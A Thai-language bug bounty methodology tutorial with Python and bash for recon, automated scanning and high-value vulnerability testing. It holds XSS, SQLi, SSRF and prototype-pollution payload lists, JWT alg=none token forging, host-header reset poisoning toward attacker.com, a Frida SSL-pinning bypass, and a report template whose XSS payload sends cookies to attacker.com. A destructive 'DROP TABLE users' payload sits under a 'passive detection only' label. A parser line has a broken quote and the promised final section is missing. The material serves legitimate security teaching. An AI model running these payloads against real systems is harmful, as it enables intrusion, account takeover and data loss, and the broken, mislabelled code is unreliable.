# Part 70: Bug Bounty Methodology (วิธีการหาบั๊กรับรางวัล)

## สารบัญ
1. [Bug Bounty Overview](#bug-bounty-overview)
2. [Scope Analysis and Reconnaissance](#scope-analysis-and-reconnaissance)
3. [Systematic Testing Approach](#systematic-testing-approach)
4. [High-Value Vulnerabilities](#high-value-vulnerabilities)
5. [Business Logic Flaws](#business-logic-flaws)
6. [API Security Testing](#api-security-testing)
7. [Mobile Application Testing](#mobile-application-testing)
8. [Report Writing](#report-writing)
9. [Automation Tools](#automation-tools)
10. [Tips for Success](#tips-for-success)

---

## 1. Bug Bounty Overview

### แพลตฟอร์ม Bug Bounty

| แพลตฟอร์ม | ความนิยม | รางวัลสูงสุด |
|-----------|----------|---------------|
| HackerOne | สูงมาก | $1M+ |
| Bugcrowd | สูง | $500K+ |
| Intigriti | สูง (EU) | $100K+ |
| Synack | สูง (เชิญ) | $100K+ |
| YesWeHack | กาลังเติบโต | $50K+ |

### Bug Bounty Priority Matrix

```
┌─────────────────────────────────────────────────────────┐
│        Impact High          Impact Low              │
│                                                       │
│  Likelihood High  │ P1 CRITICAL │ P2 HIGH           │
│  Likelihood Low   │ P2 HIGH     │ P3 MEDIUM         │
└─────────────────────────────────────────────────────────┘

P1 Critical: RCE, SQLi, Account Takeover -> $5,000-$50,000+
P2 High: XSS (stored), SSRF, XXE -> $1,000-$10,000
P3 Medium: CSRF, IDOR, Info Disclosure -> $300-$2,000
P4 Low: Misconfiguration, Self-XSS -> $0-$500
```

---

## 2. Scope Analysis and Reconnaissance

### วิเคราะห์ขอบเขตก่อนเริ่ม

```python
#!/usr/bin/env python3
# scope_analyzer.py - วิเคราะห์ scope ของ bug bounty

import re
import json
from typing import Dict, List, Set
from urllib.parse import urlparse

class ScopeAnalyzer:
    """วิเคราะห์และจัดการ bug bounty scope"""
    
    def __init__(self):
        self.in_scope_domains = []
        self.out_of_scope_domains = []
        self.in_scope_ips = []
        self.wildcard_domains = []
    
    def parse_scope(self, scope_text: str):
        """วิเคราะห์ scope text จาก program brief"""
        lines = scope_text.strip().split('\n')
        current_section = None
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            if 'in scope' in line.lower() or 'inscope' in line.lower():
                current_section = 'in'
            elif 'out of scope' in line.lower() or 'outofscope' in line.lower():
                current_section = 'out'
            elif current_section == 'in':
                # Parse domain/IP
                if '*.` in line:
                    self.wildcard_domains.append(line.strip('*. '))
                elif re.match(r'[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', line):
                    self.in_scope_domains.append(line)
                elif re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line):
                    self.in_scope_ips.append(line)
            elif current_section == 'out':
                self.out_of_scope_domains.append(line)
    
    def is_in_scope(self, target: str) -> bool:
        """ตรวจสอบว่าอยู่ใน scope"""
        parsed = urlparse(target)
        hostname = parsed.hostname or target
        
        # ตรวจสอบ out of scope ก่อน
        for oos in self.out_of_scope_domains:
            if hostname.endswith(oos) or hostname == oos:
                return False
        
        # ตรวจสอป wildcard
        for wc in self.wildcard_domains:
            if hostname.endswith(f'.{wc}') or hostname == wc:
                return True
        
        # ตรวจสอป explicit
        return hostname in self.in_scope_domains
    
    def estimate_attack_surface(self) -> Dict:
        """ประเมิน attack surface"""
        return {
            'wildcard_domains': len(self.wildcard_domains),
            'explicit_domains': len(self.in_scope_domains),
            'ip_ranges': len(self.in_scope_ips),
            'estimated_subdomains': len(self.wildcard_domains) * 50,
            'priority': 'HIGH' if len(self.wildcard_domains) > 5 else 'MEDIUM'
        }


# ตัวอย่าง Bug Bounty Recon Checklist
BUG_BOUNTY_RECON_CHECKLIST = [
    # Subdomain Enumeration
    "subfinder -d target.com -o subdomains.txt",
    "amass enum -passive -d target.com",
    "assetfinder --subs-only target.com",
    "crt.sh: https://crt.sh/?q=%.target.com",
    
    # Live Host Discovery
    "httpx -l subdomains.txt -o live_hosts.txt -title -tech-detect -status-code",
    
    # Wayback Machine
    "waybackurls target.com | tee wayback_urls.txt",
    "gau target.com | tee gau_urls.txt",
    
    # Port Scanning
    "nmap -sV -T4 -p- --min-rate 5000 live_hosts.txt -oN nmap_full.txt",
    
    # Web Tech Detection
    "wappalyzer target.com",
    "whatweb -a 3 target.com",
    
    # JavaScript Analysis
    "subjs -l live_hosts.txt | tee js_files.txt",
    "cat js_files.txt | xargs -I{} linkfinder.py -i {} -o cli",
    
    # Directory Discovery
    "ffuf -w /wordlists/common.txt -u https://target.com/FUZZ -mc 200,301,302,403",
    "dirsearch -u https://target.com -e php,aspx,jsp,html -t 50",
    
    # Parameter Discovery
    "arjun -u https://target.com/api/endpoint -t 20",
    "paramspider --domain target.com",
    
    # Secrets Discovery
    "trufflehog https://github.com/target-company --json",
    "git-secrets --scan-history"
]


def print_recon_plan(target: str):
    print(f"\n=== Bug Bounty Recon Plan: {target} ===")
    for i, cmd in enumerate(BUG_BOUNTY_RECON_CHECKLIST, 1):
        cmd = cmd.replace('target.com', target)
        print(f"[{i:02d}] {cmd}")


if __name__ == "__main__":
    # ตัวอย่าง scope analysis
    scope_text = """
    In Scope:
    *.example.com
    app.example.com
    api.example.com
    192.168.1.0/24
    
    Out of Scope:
    admin.example.com
    support.example.com
    """
    
    analyzer = ScopeAnalyzer()
    analyzer.parse_scope(scope_text)
    
    surface = analyzer.estimate_attack_surface()
    print("Attack Surface:")
    for k, v in surface.items():
        print(f"  {k}: {v}")
    
    # ตรวจสอป scope
    tests = ['app.example.com', 'admin.example.com', 'new.example.com']
    for t in tests:
        print(f"  {t}: {'IN SCOPE' if analyzer.is_in_scope(t) else 'OUT OF SCOPE'}")
```

---

## 3. Systematic Testing Approach

### Bug Bounty Testing Framework

```python
#!/usr/bin/env python3
# bb_tester.py - Systematic bug bounty testing

import requests
import json
from typing import List, Dict
from urllib.parse import urljoin, urlparse

class BugBountyTester:
    """การทดสอบอย่างเป็นระบบสำหรับ bug bounty"""
    
    def __init__(self, base_url: str, session: requests.Session = None):
        self.base_url = base_url.rstrip('/')
        self.session = session or requests.Session()
        self.findings = []
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Researcher)',
        })
    
    def test_authentication_bypass(self) -> List[Dict]:
        """ทดสอป authentication bypass"""
        findings = []
        
        # 1. ทดสอปเข้าหน้าแล้วโดยไม่ต้องเข้าสู่
        admin_paths = [
            '/admin', '/admin/', '/admin/dashboard',
            '/backend', '/manager', '/cms',
            '/phpMyAdmin', '/wp-admin',
            '/api/admin', '/v1/admin'
        ]
        
        for path in admin_paths:
            try:
                r = self.session.get(
                    self.base_url + path,
                    allow_redirects=False,
                    timeout=10
                )
                
                if r.status_code == 200:
                    findings.append({
                        'type': 'UNAUTHENTICATED_ACCESS',
                        'severity': 'HIGH',
                        'url': self.base_url + path,
                        'status': r.status_code,
                        'description': f'Admin panel accessible without auth: {path}'
                    })
            except requests.RequestException:
                pass
        
        return findings
    
    def test_idor(self, endpoint: str, user_id: str, other_ids: List[str]) -> List[Dict]:
        """ทดสอป IDOR (Insecure Direct Object Reference)"""
        findings = []
        
        # ปรับ ID ใน endpoint
        for other_id in other_ids:
            test_url = endpoint.replace(user_id, other_id)
            
            try:
                r = self.session.get(test_url, timeout=10)
                
                if r.status_code == 200:
                    # ตรวจสอปว่ามีข้อมูล user อื่น
                    findings.append({
                        'type': 'IDOR',
                        'severity': 'HIGH',
                        'original_url': endpoint,
                        'modified_url': test_url,
                        'description': f'Access to other user data via ID manipulation'
                    })
            except requests.RequestException:
                pass
        
        return findings
    
    def test_xss_reflected(self, urls: List[str]) -> List[Dict]:
        """ทดสอป reflected XSS"""
        findings = []
        
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"<script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '\"onmouseover=\"alert(1)',
        ]
        
        for url in urls:
            parsed = urlparse(url)
            
            for payload in xss_payloads:
                test_url = url.replace('FUZZ', requests.utils.quote(payload))
                
                try:
                    r = self.session.get(test_url, timeout=10)
                    
                    # ตรวจสอปว่า payload สะท้อนโดยไม่ถูก encode
                    if payload in r.text:
                        findings.append({
                            'type': 'XSS_REFLECTED',
                            'severity': 'HIGH',
                            'url': test_url,
                            'payload': payload,
                            'description': 'Reflected XSS found'
                        })
                        break  # หยุดเมื่อเจอ
                except requests.RequestException:
                    pass
        
        return findings
    
    def test_sql_injection(self, endpoints: List[str]) -> List[Dict]:
        """ทดสอป SQL Injection (passive detection only)"""
        findings = []
        
        error_payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "1 AND 1=1",
            "1 AND 1=2",
            "1; DROP TABLE users--"
        ]
        
        sql_errors = [
            'SQL syntax', 'mysql_fetch', 'ORA-', 
            'PostgreSQL', 'sqlite3_', 'Microsoft SQL',
            'You have an error in your SQL syntax',
            'Unclosed quotation mark'
        ]
        
        for endpoint in endpoints:
            for payload in error_payloads:
                test_url = endpoint.replace('FUZZ', requests.utils.quote(payload))
                
                try:
                    r = self.session.get(test_url, timeout=10)
                    
                    for error in sql_errors:
                        if error.lower() in r.text.lower():
                            findings.append({
                                'type': 'SQL_INJECTION',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'payload': payload,
                                'error': error,
                                'description': 'SQL error in response - possible SQLi'
                            })
                            break
                except requests.RequestException:
                    pass
        
        return findings
    
    def test_ssrf(self, endpoints: List[str], callback_url: str) -> List[Dict]:
        """ทดสอป SSRF"""
        findings = []
        
        ssrf_payloads = [
            f'http://{callback_url}/',
            f'https://{callback_url}/',
            f'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://localhost/',
            'http://127.0.0.1/',
            'http://[::1]/',
            'file:///etc/passwd',
        ]
        
        for endpoint in endpoints:
            for payload in ssrf_payloads:
                test_url = endpoint.replace('FUZZ', requests.utils.quote(payload))
                
                try:
                    r = self.session.get(test_url, timeout=10)
                    
                    # ตรวจสอป AWS metadata response
                    if 'ami-id' in r.text or 'instance-id' in r.text:
                        findings.append({
                            'type': 'SSRF',
                            'severity': 'CRITICAL',
                            'url': test_url,
                            'payload': payload,
                            'description': 'SSRF to AWS metadata service'
                        })
                    elif 'root:x:0:0' in r.text:
                        findings.append({
                            'type': 'SSRF_FILE_READ',
                            'severity': 'CRITICAL',
                            'url': test_url,
                            'payload': payload,
                            'description': 'SSRF to read local files'
                        })
                except requests.RequestException:
                    pass
        
        return findings
    
    def run_all_tests(self, endpoints: List[str] = None) -> List[Dict]:
        """รัน tests ทั้งหมด"""
        all_findings = []
        
        print(f"[*] Testing: {self.base_url}")
        
        # Auth bypass
        print("[*] Testing authentication bypass...")
        all_findings.extend(self.test_authentication_bypass())
        
        # XSS
        if endpoints:
            print("[*] Testing XSS...")
            all_findings.extend(self.test_xss_reflected(endpoints))
            
            print("[*] Testing SQL Injection...")
            all_findings.extend(self.test_sql_injection(endpoints))
        
        self.findings = all_findings
        return all_findings
    
    def generate_report(self) -> str:
        findings = sorted(
            self.findings, 
            key=lambda x: {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}.get(x.get('severity', 'INFO'), 4)
        )
        
        report = f"# Bug Bounty Test Report\n"
        report += f"**Target**: {self.base_url}\n"
        report += f"**Total Findings**: {len(findings)}\n\n"
        
        for finding in findings:
            report += f"## [{finding['severity']}] {finding['type']}\n"
            report += f"- URL: {finding.get('url', 'N/A')}\n"
            report += f"- Description: {finding.get('description', 'N/A')}\n"
            if finding.get('payload'):
                report += f"- Payload: `{finding['payload']}`\n"
            report += "\n"
        
        return report


if __name__ == "__main__":
    tester = BugBountyTester("https://target.example.com")
    
    # ตัวอย่าง endpoints
    endpoints = [
        "https://target.example.com/search?q=FUZZ",
        "https://target.example.com/api/user?id=FUZZ",
    ]
    
    findings = tester.run_all_tests(endpoints)
    print(f"\n[+] Total findings: {len(findings)}")
    print(tester.generate_report())
```

---

## 4. High-Value Vulnerabilities

### Critical Bug Patterns

```python
#!/usr/bin/env python3
# high_value_bugs.py - ค้นหาช่องโหว่ได้เงินสูง

import requests
import json
from typing import Dict, List

# ===== Account Takeover Techniques =====

class AccountTakeoverTester:
    """ทดสอป account takeover vulnerabilities"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_password_reset_poisoning(self, email: str) -> Dict:
        """ทดสอป host header poisoning ใน password reset"""
        # แทน Host header ด้วย attacker's domain
        headers = {
            'Host': 'attacker.com',
            'X-Forwarded-Host': 'attacker.com',
            'X-Host': 'attacker.com'
        }
        
        data = {'email': email}
        
        try:
            r = requests.post(
                f"{self.base_url}/forgot-password",
                json=data,
                headers=headers,
                timeout=10
            )
            
            return {
                'test': 'password_reset_poisoning',
                'status': r.status_code,
                'note': 'Check if reset email contains attacker.com link'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def test_jwt_vulnerabilities(self, token: str) -> List[Dict]:
        """ทดสอป JWT security issues"""
        findings = []
        
        try:
            import base64
            
            # Decode JWT (base64)
            parts = token.split('.')
            if len(parts) != 3:
                return findings
            
            # ถอด header
            header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.b64decode(header_b64))
            
            # ถอด payload
            payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.b64decode(payload_b64))
            
            print(f"JWT Header: {header}")
            print(f"JWT Payload: {payload}")
            
            # Test 1: alg=none attack
            none_header = base64.b64encode(
                json.dumps({'typ': 'JWT', 'alg': 'none'}).encode()
            ).decode().rstrip('=')
            
            none_token = f"{none_header}.{parts[1]}."
            findings.append({
                'test': 'jwt_none_algorithm',
                'token': none_token,
                'note': 'Try this token - if works, critical vulnerability'
            })
            
            # Test 2: HS256 with empty secret
            import hmac
            import hashlib
            
            empty_sig = hmac.new(
                b'', 
                f"{parts[0]}.{parts[1]}".encode(),
                hashlib.sha256
            ).digest()
            empty_token = f"{parts[0]}.{parts[1]}.{base64.urlsafe_b64encode(empty_sig).decode().rstrip('=')}"
            
            findings.append({
                'test': 'jwt_empty_secret',
                'token': empty_token,
                'note': 'Try with empty secret'
            })
            
        except Exception as e:
            findings.append({'error': str(e)})
        
        return findings
    
    def test_oauth_vulnerabilities(self, auth_url: str, callback_url: str) -> List[Dict]:
        """ทดสอป OAuth security issues"""
        findings = []
        
        # Test 1: state parameterว่างเปล่า
        if 'state=' not in auth_url:
            findings.append({
                'type': 'CSRF_OAUTH',
                'severity': 'HIGH',
                'description': 'OAuth flow missing state parameter - CSRF risk'
            })
        
        # Test 2: Redirect URI manipulation
        open_redirect_tests = [
            callback_url + '//attacker.com',
            'https://attacker.com',
            callback_url.replace('https://', 'https://attacker.com@'),
        ]
        
        for test_redirect in open_redirect_tests:
            test_auth_url = auth_url + f'&redirect_uri={requests.utils.quote(test_redirect)}'
            findings.append({
                'type': 'OAUTH_REDIRECT_BYPASS',
                'test_url': test_auth_url,
                'note': f'Test if redirect to {test_redirect} is allowed'
            })
        
        return findings


# ===== SSRF Advanced =====
def test_ssrf_bypass(url_param: str) -> List[str]:
    """เพยเดล SSRF bypass techniques"""
    target_ip = "127.0.0.1"
    
    bypasses = [
        # IP encoding
        f"http://2130706433/",           # decimal IP
        f"http://0x7f000001/",           # hex IP
        f"http://0177.0.0.1/",           # octal IP
        f"http://[::1]/",               # IPv6
        f"http://127.1/",               # short IP
        f"http://127.0.1/",
        
        # Protocol bypass
        f"dict://127.0.0.1:6379/info",   # Redis
        f"gopher://127.0.0.1:6379/_INFO", # Redis gopher
        f"file:///etc/passwd",           # LFI
        
        # DNS rebinding (use rebinder service)
        f"http://rebind.attacker.com/",
        
        # CNAME tricks
        f"http://localtest.me/",  # resolves to 127.0.0.1
        f"http://127.0.0.1.nip.io/",
        
        # AWS/GCP metadata
        f"http://169.254.169.254/latest/meta-data/",  # AWS
        f"http://metadata.google.internal/",           # GCP
        f"http://169.254.169.254/metadata/instance",  # Azure
    ]
    
    return bypasses


# ===== Prototype Pollution =====
PROTO_POLLUTION_PAYLOADS = [
    '{"__proto__": {"admin": true}}',
    '{"__proto__": {"isAdmin": "true"}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"__proto__.__proto__": {"admin": true}}',
]

def test_prototype_pollution(url: str) -> List[Dict]:
    """ทดสอป Prototype Pollution"""
    findings = []
    
    for payload in PROTO_POLLUTION_PAYLOADS:
        try:
            r = requests.post(
                url,
                data=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            resp_data = r.json() if r.headers.get('content-type', '').startswith('application/json') else {}
            
            if resp_data.get('admin') == True or resp_data.get('isAdmin') == 'true':
                findings.append({
                    'type': 'PROTOTYPE_POLLUTION',
                    'severity': 'HIGH',
                    'payload': payload,
                    'url': url
                })
        except Exception:
            pass
    
    return findings


if __name__ == "__main__":
    print("[*] High-Value Bug Testing Examples")
    
    # Test JWT
    sample_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    ato = AccountTakeoverTester("https://target.example.com")
    jwt_findings = ato.test_jwt_vulnerabilities(sample_jwt)
    
    print("JWT Vulnerabilities to Test:")
    for f in jwt_findings:
        print(f"  - {f.get('test', 'unknown')}: {f.get('note', '')}")
    
    # SSRF bypasses
    bypasses = test_ssrf_bypass("url")
    print(f"\nSSRF Bypass Payloads: {len(bypasses)}")
    for b in bypasses[:5]:
        print(f"  {b}")
```

---

## 5. Business Logic Flaws

```python
#!/usr/bin/env python3
# business_logic_tester.py - ทดสอป business logic

import requests
from typing import List, Dict

class BusinessLogicTester:
    """ทดสอป business logic flaws"""
    
    def __init__(self, base_url: str, auth_token: str = None):
        self.base_url = base_url
        self.session = requests.Session()
        if auth_token:
            self.session.headers['Authorization'] = f'Bearer {auth_token}'
    
    def test_race_condition(self, endpoint: str, data: dict, threads: int = 20) -> Dict:
        """ทดสอป race condition"""
        import threading
        import time
        
        results = []
        
        def make_request():
            try:
                r = self.session.post(
                    self.base_url + endpoint,
                    json=data,
                    timeout=10
                )
                results.append({
                    'status': r.status_code,
                    'body': r.text[:200],
                    'time': time.time()
                })
            except:
                pass
        
        # สร้าง threads ทั้งหมดก่อน
        thread_list = [threading.Thread(target=make_request) for _ in range(threads)]
        
        # Start all พร้อมกัน (nearly simultaneous)
        for t in thread_list:
            t.start()
        
        for t in thread_list:
            t.join()
        
        # วิเคราะห์ผล
        success_count = sum(1 for r in results if r['status'] == 200)
        
        return {
            'threads': threads,
            'total_requests': len(results),
            'success_count': success_count,
            'possible_race': success_count > 1,
            'note': 'If success_count > 1, race condition exists'
        }
    
    def test_negative_values(self, endpoint: str, field: str) -> List[Dict]:
        """ทดสอป negative numbers"""
        findings = []
        
        test_values = [-1, -100, -9999, 0, 0.01, 999999]
        
        for value in test_values:
            try:
                r = self.session.post(
                    self.base_url + endpoint,
                    json={field: value},
                    timeout=10
                )
                
                if r.status_code == 200:
                    findings.append({
                        'type': 'NEGATIVE_VALUE',
                        'field': field,
                        'value': value,
                        'status': r.status_code,
                        'response': r.text[:200]
                    })
            except:
                pass
        
        return findings
    
    def test_coupon_abuse(self, coupon_endpoint: str, coupon_code: str) -> Dict:
        """ทดสอป coupon abuse"""
        # ทดสอปใช้ซ้ำ
        attempts = 5
        results = []
        
        for i in range(attempts):
            try:
                r = self.session.post(
                    self.base_url + coupon_endpoint,
                    json={'coupon': coupon_code},
                    timeout=10
                )
                results.append({'attempt': i+1, 'status': r.status_code})
            except:
                pass
        
        success = sum(1 for r in results if r['status'] == 200)
        
        return {
            'test': 'coupon_reuse',
            'attempts': attempts,
            'successes': success,
            'vulnerable': success > 1
        }
    
    def test_price_manipulation(self, cart_endpoint: str) -> List[Dict]:
        """ทดสอป price manipulation"""
        findings = []
        
        # ทดสอปใส่ราคาใน request
        price_modifications = [
            {'price': 0},
            {'price': -1},
            {'price': 0.01},
            {'price': 1},
        ]
        
        for mod in price_modifications:
            try:
                r = self.session.post(
                    self.base_url + cart_endpoint,
                    json={'price': mod['price'], 'quantity': 1, 'product_id': 1},
                    timeout=10
                )
                
                if r.status_code in [200, 201]:
                    findings.append({
                        'type': 'PRICE_MANIPULATION',
                        'severity': 'CRITICAL',
                        'modification': mod,
                        'response_status': r.status_code
                    })
            except:
                pass
        
        return findings


# COMMON BUSINESS LOGIC CHECKS
BUSINESS_LOGIC_CHECKLIST = [
    "Can I use a coupon multiple times?",
    "Can I set negative quantity to get refund?",
    "Can I access admin features with low privilege?",
    "Can I apply discount after checkout?",
    "Race condition in fund transfer?",
    "Can I manipulate price in client-side request?",
    "Can I access another user's order history?",
    "Can I skip steps in checkout flow?",
    "Can I use expired vouchers?",
    "Can I exceed maximum purchase limit?",
]

if __name__ == "__main__":
    print("Business Logic Test Checklist:")
    for i, check in enumerate(BUSINESS_LOGIC_CHECKLIST, 1):
        print(f"  [{i:02d}] {check}")
```

---

## 6. API Security Testing

```python
#!/usr/bin/env python3
# api_tester.py - API security testing

import requests
import json
from typing import List, Dict

class APISecurityTester:
    """ทดสอป API security"""
    
    def __init__(self, base_url: str, api_key: str = None):
        self.base_url = base_url
        self.session = requests.Session()
        if api_key:
            self.session.headers['X-API-Key'] = api_key
    
    def test_mass_assignment(self, endpoint: str, normal_data: dict) -> List[Dict]:
        """ทดสอป Mass Assignment"""
        findings = []
        
        # เพิ่ม privileged fields
        privileged_fields = [
            {'role': 'admin'},
            {'is_admin': True},
            {'admin': True},
            {'privileges': ['admin', 'superuser']},
            {'balance': 99999},
            {'credits': 99999},
            {'subscription': 'premium'},
        ]
        
        for priv_field in privileged_fields:
            test_data = {**normal_data, **priv_field}
            
            try:
                r = self.session.post(
                    self.base_url + endpoint,
                    json=test_data,
                    timeout=10
                )
                
                # ตรวจสอป response
                resp_data = r.json() if r.ok else {}
                field_name = list(priv_field.keys())[0]
                
                if resp_data.get(field_name) == list(priv_field.values())[0]:
                    findings.append({
                        'type': 'MASS_ASSIGNMENT',
                        'severity': 'HIGH',
                        'field': field_name,
                        'value': list(priv_field.values())[0],
                        'endpoint': endpoint
                    })
            except:
                pass
        
        return findings
    
    def test_api_versioning(self, endpoints: List[str]) -> List[Dict]:
        """ทดสอป เข้าถึง old API versions"""
        findings = []
        
        versions = ['v1', 'v2', 'v3', 'v1.0', 'v2.0', 'beta', 'legacy', 'old']
        
        for endpoint in endpoints:
            for version in versions:
                test_url = endpoint.replace('/v', f'/{version}')
                if test_url == endpoint:
                    test_url = f"{self.base_url}/{version}{endpoint}"
                
                try:
                    r = self.session.get(test_url, timeout=10)
                    
                    if r.status_code == 200:
                        findings.append({
                            'type': 'API_VERSION_EXPOSED',
                            'severity': 'MEDIUM',
                            'url': test_url,
                            'note': f'Old API version {version} accessible'
                        })
                except:
                    pass
        
        return findings
    
    def test_http_method_bypass(self, endpoint: str) -> List[Dict]:
        """ทดสอป HTTP method bypass"""
        findings = []
        
        dangerous_methods = [
            ('DELETE', {}),
            ('PUT', {'test': 'value'}),
            ('PATCH', {'test': 'value'}),
        ]
        
        for method, data in dangerous_methods:
            try:
                r = self.session.request(
                    method,
                    self.base_url + endpoint,
                    json=data if data else None,
                    timeout=10
                )
                
                if r.status_code in [200, 201, 204]:
                    findings.append({
                        'type': 'HTTP_METHOD_ALLOWED',
                        'severity': 'HIGH',
                        'method': method,
                        'url': self.base_url + endpoint,
                        'status': r.status_code
                    })
            except:
                pass
        
        return findings
    
    def test_graphql_introspection(self) -> List[Dict]:
        """ทดสอป GraphQL introspection"""
        findings = []
        
        introspection_query = {
            'query': '''
                {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        types { name kind }
                    }
                }
            '''
        }
        
        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/query']
        
        for endpoint in graphql_endpoints:
            try:
                r = self.session.post(
                    self.base_url + endpoint,
                    json=introspection_query,
                    timeout=10
                )
                
                if r.ok and 'data' in r.json():
                    schema = r.json().get('data', {}).get('__schema', {})
                    if schema:
                        types = [t['name'] for t in schema.get('types', [])]
                        findings.append({
                            'type': 'GRAPHQL_INTROSPECTION',
                            'severity': 'MEDIUM',
                            'url': self.base_url + endpoint,
                            'types_found': types[:10],
                            'description': 'GraphQL introspection enabled'
                        })
            except:
                pass
        
        return findings


if __name__ == "__main__":
    print("[*] API Security Testing")
    tester = APISecurityTester("https://api.target.example.com")
    
    # ตัวอย่าง mass assignment test
    normal_user_data = {'name': 'John', 'email': 'john@example.com', 'password': 'pass123'}
    
    print("Mass Assignment test data:")
    print(json.dumps(normal_user_data, indent=2))
    print("\nAdding privileged fields to test...")
```

---

## 7. Mobile Application Testing

```bash
# ===== Mobile App Testing =====

# Android testing
# 1. APK Extraction
adb backup -apk -noshared -nosystem com.target.app
dd if=backup.ab bs=24 skip=1 | python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > backup.tar

# 2. Decompile APK
apktool d target.apk -o target_decoded
javap -classpath target.apk -c MainActivity

# JADX decompile
jadx -d target_src target.apk

# 3. ค้นหา hardcoded secrets
grep -r 'password\|secret\|api_key\|token' target_decoded/ 2>/dev/null
grep -r 'http\|https' target_decoded/res/ 2>/dev/null

# 4. Certificate pinning bypass (Frida)
frida -U -f com.target.app -l sslpinning_bypass.js

# sslpinning_bypass.js (Frida script)
cat > sslpinning_bypass.js << 'EOF'
Java.perform(function() {
    var array_list = Java.use("java.util.ArrayList");
    var ApiClient = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    
    ApiClient.checkTrustedRecursive.implementation = function(a1, a2, a3, a4, a5, a6) {
        console.log('[*] SSL Pinning bypassed');
        return array_list.$new();
    };
});
EOF

# 5. Intercept traffic (Burp Suite)
adb shell settings put global http_proxy 192.168.1.100:8080

# 6. Root detection bypass
frida -U -f com.target.app -l root_bypass.js

# iOS testing
# สามารถใช้ objection สำหรับ certificate pinning bypass
objection --gadget com.target.app explore
iOS ssl unpinning
android sslpinning disable

# MobSF analysis
mobsfscan --json /tmp/report.json target.apk
```

---

## 8. Report Writing

### Bug Report Template

```markdown
# [P2-HIGH] Stored XSS in User Profile - Affecting All Users

## Summary
พบ Stored XSS ในหน้า User Profile โดยใน field "Display Name" ไม่มีการ sanitize input
ส่งผลให้ผู้โจมตีสามารถเรียกใช้ JavaScript code ใน browser ของ victim

## Severity
High (CVSS 8.2)

## Impact
- ขโมย session cookies ของ user
- ทำ Phishing ผ่าน DOM manipulation
- Defacementของหน้าเว็บ

## Steps to Reproduce
1. เข้าสู่ระบบด้วยบัญชีจริง
2. ไปที่ Settings > Profile
3. ใส่ payload ใน "Display Name" field:
```
<script>document.location='https://attacker.com/?c='+document.cookie</script>
```
4. Save การเปลี่ยนแปลง
5. เปิดเปิด browser tab ใหม่ เข้า profile (สมมติว่า victim ดู profile ของ attacker)
6. Cookie ถูกส่งไปยัง attacker.com

## Proof of Concept
[Screenshot หรือ Video]
[HTTP Request/Response]

## Remediation
- Sanitize HTML input (ใช้ DOMPurify หรือ similar library)
- Implement Content-Security-Policy header
- Encode output ก่อนแสดงผล
- Set HttpOnly flag บน session cookie

## References
- OWASP XSS Prevention: https://owasp.org/www-community/attacks/xss/
- CWE-79: Improper Neutralization of Input During Web Page Generation
```

---

## 9. Automation Tools

```bash
# ===== Bug Bounty Automation Suite =====

# 1. ติดตั้ง essential tools
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/ffuf/ffuf@latest

# 2. สร้าง automation pipeline
cat > /opt/bb/auto_recon.sh << 'EOF'
#!/bin/bash
TARGET=$1
OUTDIR="/bb/results/$TARGET"
mkdir -p $OUTDIR

echo "[*] Starting recon: $TARGET"

# Subdomains
echo "[1] Subdomain enumeration"
subfinder -d $TARGET -o $OUTDIR/subdomains.txt -silent
amass enum -passive -d $TARGET >> $OUTDIR/subdomains.txt 2>/dev/null
sort -u $OUTDIR/subdomains.txt -o $OUTDIR/subdomains.txt
echo "[+] Found $(wc -l < $OUTDIR/subdomains.txt) subdomains"

# Live hosts
echo "[2] Live host discovery"
httpx -l $OUTDIR/subdomains.txt \
    -o $OUTDIR/live_hosts.txt \
    -title -tech-detect -status-code \
    -silent

# Port scan
echo "[3] Port scanning"
naabu -l $OUTDIR/live_hosts.txt \
    -o $OUTDIR/open_ports.txt \
    -silent

# Nuclei scan
echo "[4] Vulnerability scanning"
nuclei -l $OUTDIR/live_hosts.txt \
    -t ~/nuclei-templates/ \
    -severity critical,high,medium \
    -o $OUTDIR/nuclei_results.txt

# Wayback URLs
echo "[5] Historical URLs"
waybackurls $TARGET | tee $OUTDIR/wayback.txt
gau $TARGET | tee -a $OUTDIR/wayback.txt
sort -u $OUTDIR/wayback.txt -o $OUTDIR/wayback.txt

# Parameter discovery
echo "[6] Parameter discovery"
cat $OUTDIR/wayback.txt | grep '?' | unfurl keys | sort -u | tee $OUTDIR/params.txt

# สรุป
echo "[+] Recon complete!"
echo "Subdomains: $(wc -l < $OUTDIR/subdomains.txt)"
echo "Live hosts: $(wc -l < $OUTDIR/live_hosts.txt)"
echo "Open ports: $(wc -l < $OUTDIR/open_ports.txt)"
echo "Nuclei findings: $(wc -l < $OUTDIR/nuclei_results.txt)"
EOF
chmod +x /opt/bb/auto_recon.sh

